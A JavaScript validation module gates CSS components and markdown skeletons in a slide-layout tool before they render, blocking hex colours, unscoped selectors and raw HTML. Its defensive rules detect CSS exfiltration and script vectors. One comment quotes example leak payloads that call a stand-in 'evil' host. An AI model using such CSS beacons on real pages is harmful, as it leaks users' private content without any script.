/**
 * Layout Studio — the deterministic GATES for a CSS-only local component
 * (Faculty 2, the Form-layer sibling of lib/theme). Pure, `fs`-free,
 * dependency-free, so it bundles into the browser core AND unit-tests in Node
 * with no fixtures.
 *
 * The discipline is the Architect's, restated for components: **the model
 * proposes; deterministic gates dispose.** A draft (CSS + manifest + skeleton)
 * can never render until it clears the same invariants the engine already
 * enforces at build time, run here client-side:
 *
 *   1. Tokens only (`var(--…)`) — NO hex literals (CLAUDE.md "No hex literals
 *      in layout rules"). A hex is flagged; the author swaps in a token.
 *   2. `.<name>` selector scoping — every rule must target the component's
 *      own `_class`, so a local component can never leak onto other slides.
 *      This is the runtime analogue of the `section.<name> …` convention every
 *      shipped `styles.css` already follows (build-css.js concatenates them
 *      unwrapped, trusting that scoping).
 *   3. Manifest coherence — required fields, valid enums, and the CSS-only
 *      constraint: substance must be `prose` or `structure` (the two
 *      no-transform substances, design/design-system.md §5). `series`/`graph`
 *      need a transform.js and reach authors only via graduation, never as a
 *      runtime asset (the three-render-paths rule).
 *   4. Skeleton coherence — the skeleton must invoke the component's `_class`.
 *
 * Errors block rendering; warnings inform. `gateComponent` aggregates.
 */

// DERIVED from lib/components/manifest.schema.json — the manifest contract's
// source of truth. A JSON require is fs-free at runtime (esbuild inlines it
// into the layout-core browser bundle), so this module no longer carries the
// hand-synced copy that had already drifted (it was missing the `connect`
// bucket the schema and loader both knew).
const MANIFEST_SCHEMA = require('../components/manifest.schema.json');
// Same deep-freeze index.js applies: the browser bundle inlines a FRESH copy
// of the JSON (esbuild), so without this the Studio's copy of the contract
// would be mutable while the Node copy is frozen.
(function deepFreeze(o) {
  if (o && typeof o === 'object' && !Object.isFrozen(o)) {
    Object.freeze(o);
    for (const v of Object.values(o)) deepFreeze(v);
  }
})(MANIFEST_SCHEMA);
const FUNCTIONS = Object.freeze(MANIFEST_SCHEMA.properties.function.enum);
const BUCKETS = Object.freeze(MANIFEST_SCHEMA.properties.bucket.enum);
const FORMS = Object.freeze(MANIFEST_SCHEMA.properties.form.enum);
const SUBSTANCES = Object.freeze(MANIFEST_SCHEMA.properties.substance.enum);
// A CSS-only local component arranges prose/structure — the substances that
// need no transform. The other three are graduation-only.
const CSS_ONLY_SUBSTANCES = Object.freeze(['prose', 'structure']);

const NAME_RE = new RegExp(MANIFEST_SCHEMA.properties.name.pattern);
// A hex colour literal: #rgb / #rgba / #rrggbb / #rrggbbaa.
const HEX_RE = /#[0-9a-fA-F]{3,8}\b/g;

// CSS constructs that reach OFF the device or execute — an exfiltration / XSS
// channel a palette-blind component never needs, and the live hole #616 §5.1
// (T-CSS) calls out: a shared/AI component's CSS could `background:url(//evil/
// ?leak)` a beacon, or attribute-leak deck text selector-by-selector
// (`[value^="a"]{background:url(//evil/a)}`), with no script at all — defeating
// the on-device confidentiality goal. `expression()`, `-moz-binding`, and
// `javascript:`/`vbscript:` schemes are legacy script vectors. We block every
// REMOTE fetch but allow the two NON-network url() targets a designer legitimately
// needs: a `#fragment` ref (an SVG filter/clip in the same document) and an inline
// `data:` URI (an icon like the shipped agenda component's data-SVG — loaded by CSS
// in secure-static mode, it can neither script nor fetch). So the legit inline-icon
// pattern survives while every off-device request is denied.
const CSS_EXFIL_RULES = Object.freeze([
  { rule: 'css-import', re: /@import\b/gi, message: '@import fetches a remote stylesheet — not allowed (it can beacon out or load attacker CSS).' },
  { rule: 'css-expression', re: /\bexpression\s*\(/gi, message: 'CSS expression() executes script — not allowed.' },
  { rule: 'css-binding', re: /-moz-binding\b/gi, message: '-moz-binding binds script to an element — not allowed.' },
  { rule: 'css-scheme', re: /\b(?:javascript|vbscript)\s*:/gi, message: 'a javascript:/vbscript: URL is a script vector — not allowed.' },
]);
// url( "…" | '…' | …unquoted ) — capture the target with its quotes; quoted forms
// may legitimately contain the other quote or parens (the agenda data-SVG does).
const URL_RE = /url\(\s*("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|[^)]*?)\s*\)/gi;
// image-set( … ) / -webkit-image-set( … ) — its bare-string form
// (`image-set("//evil" 1x)`) fetches a remote resource WITHOUT a `url()` wrapper,
// so it would slip past URL_RE; we scan the argument list's quoted targets too.
// (Any `url()` inside image-set is already caught by URL_RE separately, so the
// lazy match to the first `)` is fine — it only needs to reach the bare strings.)
const IMAGESET_RE = /(?:-webkit-)?image-set\(([\s\S]*?)\)/gi;
const QUOTED_RE = /(['"])((?:\\.|(?!\1).)*)\1/g;
// Decode CSS escapes so an obfuscated keyword can't dodge the literal matches
// below — `@imp\ort`, `\75rl(…)`, `expre\73sion(`, `java\73cript:` all normalize
// to their plain form first. `\HH ` is a hex escape (optional trailing space),
// `\x` an identity escape; a line-continuation `\\\n` is left intact.
function decodeCssEscapes(css) {
  return String(css).replace(/\\([0-9a-fA-F]{1,6})[ \t]?|\\([^\n])/g, (_, hex, ch) => {
    if (ch != null) return ch;
    const cp = parseInt(hex, 16);
    return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : '�';
  });
}
// Decode HTML character references so an entity-obfuscated scheme can't dodge the
// literal scheme match — markdown-it decodes `&#106;avascript:` / `javascript&colon;`
// at render time, so the gate must decode too (the analog of decodeCssEscapes for
// the markdown side). Numeric (`&#NN;`), hex (`&#xHH;`, optional trailing `;`), and
// the few named refs that spell a scheme's punctuation/whitespace. Only used for the
// SCHEME scan — NOT the tag scan, where an entity-encoded `<` is escaped TEXT
// (markdown renders `&lt;script&gt;` as visible characters, never a live tag).
const NAMED_ENTITIES = { colon: ':', sol: '/', tab: '\t', newline: '\n', lpar: '(', rpar: ')', period: '.', comma: ',' };
function decodeHtmlEntities(s) {
  return String(s).replace(/&#x([0-9a-fA-F]+);?|&#(\d+);?|&([a-zA-Z]+);/g, (m, hex, dec, name) => {
    if (hex != null) { const cp = parseInt(hex, 16); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; }
    if (dec != null) { const cp = parseInt(dec, 10); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; }
    const k = name.toLowerCase();
    return Object.hasOwn(NAMED_ENTITIES, k) ? NAMED_ENTITIES[k] : m;
  });
}
// A url() target is on-device (safe) only if it's a same-document #fragment or an
// inline data: URI — anything else is a network fetch.
function urlIsLocal(raw) {
  let s = String(raw).trim();
  if ((s[0] === '"' && s.endsWith('"')) || (s[0] === "'" && s.endsWith("'"))) s = s.slice(1, -1);
  s = s.trim().toLowerCase();
  return s.startsWith('#') || s.startsWith('data:');
}

/** Strip `/* … *\/` comments so gates don't flag commentary. */
function stripComments(css) {
  return String(css || '').replace(/\/\*[\s\S]*?\*\//g, m => m.replace(/[^\n]/g, ' '));
}

/** 1-based line number of a character offset. */
function lineAt(text, index) {
  let n = 1;
  for (let i = 0; i < index && i < text.length; i++) if (text[i] === '\n') n++;
  return n;
}

/**
 * Off-device / script-bearing CSS constructs (comments excluded): `@import`,
 * remote `url(...)`, `expression()`, `-moz-binding`, `javascript:`/`vbscript:`.
 * One finding per hit; `url(#frag)` and `url(data:…)` are on-device → not flagged.
 * Closes #616 §5.1 T-CSS (CSS exfiltration via a shared/AI component's styles).
 */
function findCssExfil(css) {
  // Strip comments first (so `@imp/**/ort` can't hide a keyword across a comment),
  // THEN decode CSS escapes (so `@imp\ort` / `\75rl(` can't either).
  const src = decodeCssEscapes(stripComments(css));
  const out = [];
  for (const { rule, re, message } of CSS_EXFIL_RULES) {
    for (const m of src.matchAll(re)) out.push({ rule, message, line: lineAt(src, m.index) });
  }
  const remoteUrl = (target, index) => out.push({
    rule: 'css-url-remote', line: lineAt(src, index),
    message: `url(${target}) fetches a remote resource — only inline data: URIs and #fragment refs are allowed (a remote url() can beacon deck content out).`,
  });
  for (const m of src.matchAll(URL_RE)) {
    if (!urlIsLocal(m[1])) remoteUrl(m[1], m.index);
  }
  // image-set()'s bare-string targets (no url() wrapper) — a second remote channel.
  for (const m of src.matchAll(IMAGESET_RE)) {
    for (const sm of m[1].matchAll(QUOTED_RE)) {
      if (!urlIsLocal(sm[2])) remoteUrl(sm[2], m.index);
    }
  }
  return out;
}

// The design-audit — the *native-ness* invariants the model/author must hit for a
// component to read as Lattice (beyond the safety/scope gates above). Today: the
// two deterministic, low-false-positive ones that every shipped component obeys and
// that currently slip through the gate — margin discipline (#20) and token-only
// typography (#4). (The `> .cell-stage` root from the component-gen design is a
// SHIPPED-component trait — local components target `section.<name>` directly, as the
// starters do — so it is deliberately NOT gated here. `adapt`/`capacity` coherence is
// a graduation-path advisory, tracked for a later slice.)
//
// KNOWN LIMITATION (shared by every scanner here): these strip comments, not string
// LITERALS, so a decorative `content: "margin: 12px"` that spells a property-colon
// inside a string would false-positive. It's narrow (a `::before/::after` label with
// `prop:` syntax) and string-blanking is intentionally NOT done — it would also blank
// the quoted `url("…")` targets `findCssExfil` must read. On record, not worth the risk.

// A `margin` declaration (incl. the logical longhands), capturing its value. The
// negative lookbehind for a word-char/hyphen keeps `scroll-margin` etc. out.
const MARGIN_RE = /(?<![\w-])margin(?:-(?:top|right|bottom|left|block|inline)(?:-(?:start|end))?)?\s*:\s*([^;{}]+)/gi;
// A margin value is allowed only when EVERY component is numeric zero (`0`, `0px`,
// `0%`, …) — the bare reset #20 permits. Anything else (a length, `auto`, a
// negative, a `var()`) is barred: margin is invisible to the height math a measuring
// layout depends on; space with `gap`/`padding`.
const isAllZeroMargin = (v) => String(v).replace(/!important/gi, '').trim().split(/\s+/)
  .every(t => /^-?0(?:\.0+)?(?:[a-z%]+)?$/i.test(t));

/** Non-zero `margin` declarations (comments excluded). One finding per hit (#20). */
function findMargins(css) {
  const src = stripComments(css);
  const out = [];
  for (const m of src.matchAll(MARGIN_RE)) {
    if (!isAllZeroMargin(m[1])) out.push({ value: m[1].trim(), line: lineAt(src, m.index) });
  }
  return out;
}

// `font-size` declarations whose value carries a raw absolute/container length
// instead of a `--fs-*` role token (#4). `em`/`%`/`inherit`/keywords are allowed
// (legit relative sizing); `var(--fs-…)` is the canonical form.
const FONTSIZE_RE = /(?<![\w-])font-size\s*:\s*([^;{}]+)/gi;
const RAW_FONT_LEN_RE = /\d(?:\.\d+)?\s*(px|pt|pc|in|cm|mm|rem|cqi|cqh|cqw|cqb|cqmin|cqmax|vh|vw|vmin|vmax)\b/i;

/** `font-size` set with a raw length, not a `--fs-*` token (comments excluded; #4). */
function findRawFontSize(css) {
  const src = stripComments(css);
  const out = [];
  for (const m of src.matchAll(FONTSIZE_RE)) {
    const v = m[1];
    if (/var\(\s*--fs-/.test(v)) continue; // role-token sized → fine
    if (RAW_FONT_LEN_RE.test(v)) out.push({ value: v.trim(), line: lineAt(src, m.index) });
  }
  return out;
}

/** Every hex literal in the CSS (comments excluded). One finding per hit. */
function findHexLiterals(css) {
  const src = stripComments(css);
  const out = [];
  for (const m of src.matchAll(HEX_RE)) {
    out.push({ hex: m[0], line: lineAt(src, m.index), index: m.index });
  }
  return out;
}

/**
 * Walk top-level style rules, descending into `@media`/`@supports` blocks, and
 * yield each rule's selector list with its line. Skips other at-rules
 * (`@keyframes`, `@font-face`, …) — those carry no element selectors to scope.
 * A small hand-rolled tokenizer; the input is one component's worth of CSS.
 */
function eachRule(css, visit) {
  const src = stripComments(css);
  let i = 0;
  const n = src.length;
  // Cap the `@media`/`@supports` descent depth — the input is untrusted, AI-generated
  // CSS, so a pathologically nested block must not blow the JS stack (a tab crash).
  // Real component CSS nests one, maybe two levels; 32 is unreachably generous. Beyond
  // it we stop descending (the outer regex gates on hex/margin still apply to the whole
  // string, so nothing structural slips — only selector-scoping of a 32-deep nest is skipped).
  const MAX_NEST = 32;
  function block(end, depth) {
    let chunkStart = i;
    while (i < end) {
      const ch = src[i];
      if (ch === '{') {
        const raw = src.slice(chunkStart, i);
        const head = raw.trim();
        const lead = raw.length - raw.trimStart().length; // selector starts past leading ws
        // find matching close brace
        let depth2 = 1;
        let j = i + 1;
        for (; j < end && depth2 > 0; j++) {
          if (src[j] === '{') depth2++;
          else if (src[j] === '}') depth2--;
        }
        const bodyStart = i + 1;
        const bodyEnd = j - 1;
        if (head.startsWith('@')) {
          const at = head.split(/\s/)[0].toLowerCase();
          if ((at === '@media' || at === '@supports') && depth < MAX_NEST) block2(bodyStart, bodyEnd, depth + 1);
          // else: opaque at-rule (keyframes/font-face) or past the depth cap — no descent
        } else if (head) {
          visit({ selector: head, line: lineAt(src, chunkStart + lead) });
        }
        i = j;
        chunkStart = i;
      } else {
        i++;
      }
    }
  }
  // descend helper that preserves the outer cursor
  function block2(s, e, depth) {
    const savedI = i;
    i = s;
    block(e, depth);
    i = savedI;
  }
  block(n, 0);
}

/** Does one comma-part of a selector reference `.<name>` as a class token? */
function partScoped(part, name) {
  // class token boundaries: a `.name` not followed by a name char.
  const re = new RegExp(`\\.${name.replace(/[-]/g, '\\$&')}(?![\\w-])`);
  return re.test(part);
}

/**
 * Selectors whose comma-parts don't all target `.<name>`. Each unscoped part is
 * one finding — it would leak onto other slides.
 */
function findUnscopedSelectors(css, name) {
  if (!NAME_RE.test(name || '')) return [];
  const out = [];
  eachRule(css, ({ selector, line }) => {
    for (const part of selector.split(',')) {
      const p = part.trim();
      if (!p) continue;
      if (!partScoped(p, name)) out.push({ selector: p, line });
    }
  });
  return out;
}

/** Structural manifest validation. Returns { ok, errors:[{field,message}] }. */
function validateManifest(m, { cssOnly = true } = {}) {
  const errors = [];
  const man = m && typeof m === 'object' ? m : {};
  const bad = (field, message) => errors.push({ field, message });

  if (!NAME_RE.test(man.name || '')) bad('name', 'name must be a lowercase slug (a–z, 0–9, -).');
  if (!FUNCTIONS.includes(man.function)) bad('function', `function must be one of: ${FUNCTIONS.join(', ')}.`);
  if (!FORMS.includes(man.form)) bad('form', `form must be one of: ${FORMS.join(', ')}.`);
  if (!SUBSTANCES.includes(man.substance)) {
    bad('substance', `substance must be one of: ${SUBSTANCES.join(', ')}.`);
  } else if (cssOnly && !CSS_ONLY_SUBSTANCES.includes(man.substance)) {
    bad('substance', `a CSS-only component must be prose or structure — ${man.substance} needs a transform (graduate it).`);
  }
  if (man.bucket != null && !BUCKETS.includes(man.bucket)) {
    bad('bucket', `bucket must be one of: ${BUCKETS.join(', ')}.`);
  }
  const tags = man.tags;
  if (!Array.isArray(tags) || tags.length < 3 || tags.length > 5) {
    bad('tags', 'tags must be a 3–5 item array.');
  } else if (new Set(tags).size !== tags.length || !tags.every(t => NAME_RE.test(t))) {
    bad('tags', 'tags must be unique lowercase slugs.');
  }
  if (!man.description || !String(man.description).trim()) bad('description', 'description is required.');
  if (!man.skeleton || !String(man.skeleton).trim()) bad('skeleton', 'skeleton is required.');

  return { ok: errors.length === 0, errors };
}

// A component skeleton is PURE MARKDOWN — the engine renders structure from the
// markdown DOM (lists, tables, prose, fences, math), so a skeleton never needs raw
// HTML. The ONLY sanctioned HTML is the `<!-- _class: … -->` directive comment.
// Any other raw tag is rejected outright: not just the XSS set (`<script>`,
// `<style>`, `<iframe>`, `<img onerror>`) the preview sanitizer forbids (HARD RULE
// #22, `docs/src/lib/sanitize-slide-html.js`), but ALSO benign-looking ones
// (`<br>`, `<span>`, `<div>`) — they smuggle presentation past the palette-blind
// token contract and bypass the markdown grammar the auto-chrome detection relies
// on. When a skeleton must SHOW code, it uses inline `` `code` `` or a ```fence,
// where the `<tag>` is escaped TEXT, not live HTML. This is the generation-time
// complement to the runtime sanitizer: reject the tag at the gate so it never
// reaches the (separately guarded) preview frame at all.
// A real HTML tag, matched the way CommonMark recognizes one: `<` (or `</`) with
// NO space before the tag name, a name, then a tag-boundary (`>`, whitespace,
// `/`, or end). The no-space rule is the key discriminator from prose — `a < b`
// or `revenue < budget` has a space after `<`, so it is literal text in
// CommonMark and (correctly) not flagged here; only a glued `<tag` is.
const SKELETON_HTML_RE = /<\/?[a-zA-Z][\w-]*(?=[\s/>]|$)/g;
// `javascript:`/`vbscript:` schemes — a script vector that rides a markdown link
// URL (`[x](javascript:…)`) or a `<javascript:…>` autolink, where there is no
// `<tag>` for the rule above to catch.
const SKELETON_SCHEME_RE = /\b(?:javascript|vbscript)\s*:/gi;
// CommonMark autolinks — a URL (`<https://…>`) or email (`<a@b.com>`) in angle
// brackets is VALID, benign markdown (it renders to an `<a>`, not a script), so it
// is blanked before the tag scan to avoid a false positive. A `javascript:`
// autolink has no `://`, so it is NOT blanked here and still trips the scheme rule.
const AUTOLINK_RE = /<[a-z][a-z0-9+.-]*:\/\/[^>\s]*>|<[^\s@<>]+@[^\s@<>]+>/gi;

/**
 * Strip fenced code blocks (``` … ``` / ~~~ … ~~~) and inline `code` spans from a
 * markdown skeleton, so a tag SHOWN as code (legitimate) is never mistaken for a
 * raw HTML tag. Replaces stripped runs with blanks (newlines kept) to preserve
 * line numbers for reporting.
 */
function stripMarkdownCode(md) {
  return String(md || '')
    .replace(/^[ \t]*(```|~~~)[^\n]*\n[\s\S]*?^[ \t]*\1[ \t]*$/gm, blankRun) // fenced blocks
    .replace(/`[^`\n]*`/g, blankRun); // inline code spans
}

/**
 * Raw HTML in a skeleton: ANY tag (the `_class` directive comment, code
 * spans/fences, and benign URL/email autolinks excluded) plus `javascript:`/
 * `vbscript:` link schemes. One finding per hit. A skeleton is pure markdown; the
 * generation-time complement to the preview-frame sanitizer (HARD RULE #22).
 */
function findSkeletonHtml(skeleton) {
  // ORDER MATTERS (security): strip CODE FIRST, THEN comments. Stripping comments
  // first would let an attacker hide the `<!--`/`-->` delimiters inside inline code
  // (where markdown treats them as literal text) and have the comment matcher pair
  // them ACROSS a real `<script>` between, blanking the live tag. Code-first means
  // the comment pass only ever pairs delimiters that are genuinely comment markers.
  // Then blank benign URL/email autolinks so they aren't mis-flagged as tags.
  const src = stripMarkdownCode(String(skeleton || ''))
    .replace(/<!--[\s\S]*?-->/g, blankRun)
    .replace(AUTOLINK_RE, blankRun);
  const out = [];
  for (const m of src.matchAll(SKELETON_HTML_RE)) {
    out.push({ rule: 'skeleton-html', line: lineAt(src, m.index), tag: m[0].replace(/[</\s]/g, '').toLowerCase() });
  }
  // Decode HTML entities for the scheme scan ONLY — markdown-it decodes a link
  // destination like `[x](&#106;avascript:…)` back into a live `javascript:` href.
  const decoded = decodeHtmlEntities(src);
  for (const m of decoded.matchAll(SKELETON_SCHEME_RE)) {
    out.push({ rule: 'skeleton-script', line: lineAt(decoded, m.index) });
  }
  return out;
}

/** Blank out a matched run, preserving newlines (keeps line numbers honest). */
function blankRun(m) {
  return m.replace(/[^\n]/g, ' ');
}

/** Does the skeleton invoke `<!-- _class: <name> … -->`? */
function skeletonInvokes(skeleton, name) {
  if (!skeleton || !NAME_RE.test(name || '')) return false;
  const re = new RegExp(`<!--\\s*_class:\\s*${name.replace(/[-]/g, '\\$&')}(?![\\w-])`);
  return re.test(skeleton);
}

/** CSS-only gates: hex literals + selector scoping + non-empty. */
function gateCss(css, name) {
  const findings = [];
  if (!String(css || '').trim()) {
    findings.push({ rule: 'empty-css', level: 'error', message: 'styles.css is empty.' });
    return { ok: false, findings };
  }
  for (const h of findHexLiterals(css)) {
    findings.push({
      rule: 'no-hex', level: 'error', line: h.line,
      message: `hex literal "${h.hex}" — use a palette token instead (layouts are palette-blind).`,
    });
  }
  for (const u of findUnscopedSelectors(css, name)) {
    findings.push({
      rule: 'scope', level: 'error', line: u.line,
      message: `selector "${u.selector}" is not scoped to .${name} — it would leak onto other slides.`,
    });
  }
  for (const e of findCssExfil(css)) {
    findings.push({ rule: e.rule, level: 'error', line: e.line, message: e.message });
  }
  for (const m of findMargins(css)) {
    findings.push({
      rule: 'no-margin', level: 'error', line: m.line,
      message: `margin "${m.value}" — space with \`gap\`/\`padding\` instead (HARD RULE #20: margin is invisible to the height math a measuring layout depends on).`,
    });
  }
  for (const f of findRawFontSize(css)) {
    findings.push({
      rule: 'fs-token', level: 'error', line: f.line,
      message: `font-size "${f.value}" — use a \`--fs-*\` role token (HARD RULE #4: typography is the 12-token --fs-* system), e.g. var(--fs-body).`,
    });
  }
  return { ok: findings.every(f => f.level !== 'error'), findings };
}

/**
 * Full draft gate. Returns { ok, errors:[…], warnings:[…] } where each item is
 * a normalized { rule, level, line?, message }. `ok` ⇔ no errors.
 */
function gateComponent({ name, css, manifest, skeleton } = {}, opts = {}) {
  const errors = [];
  const warnings = [];

  const man = validateManifest(manifest, opts);
  for (const e of man.errors) errors.push({ rule: 'manifest', level: 'error', field: e.field, message: e.message });

  const nameForCss = (manifest?.name) || name;
  if (NAME_RE.test(nameForCss || '')) {
    const cg = gateCss(css, nameForCss);
    for (const f of cg.findings) (f.level === 'error' ? errors : warnings).push(f);
  } else if (!man.errors.some(e => e.field === 'name')) {
    errors.push({ rule: 'name', level: 'error', message: 'a valid component name is required to scope the CSS.' });
  }

  const skel = skeleton != null ? skeleton : manifest?.skeleton;
  if (NAME_RE.test(nameForCss || '') && !skeletonInvokes(skel, nameForCss)) {
    errors.push({
      rule: 'skeleton', level: 'error',
      message: `skeleton must invoke <!-- _class: ${nameForCss} -->.`,
    });
  }
  for (const h of findSkeletonHtml(skel)) {
    errors.push(h.rule === 'skeleton-script'
      ? { rule: 'skeleton-script', level: 'error', line: h.line, message: 'skeleton carries a javascript:/vbscript: URL — not allowed (a script vector; the skeleton is pure markdown).' }
      : { rule: 'skeleton-html', level: 'error', line: h.line, message: `skeleton carries a raw <${h.tag}> tag — not allowed (the skeleton is pure markdown). To SHOW code use \`inline\` or a \`\`\`fence; to show a literal "<" write \`<\` or &lt;.` });
  }

  return { ok: errors.length === 0, errors, warnings };
}

module.exports = {
  FUNCTIONS, BUCKETS, FORMS, SUBSTANCES, CSS_ONLY_SUBSTANCES, NAME_RE,
  findHexLiterals, findCssExfil, findMargins, findRawFontSize, findUnscopedSelectors, findSkeletonHtml,
  validateManifest, skeletonInvokes, gateCss, gateComponent,
};
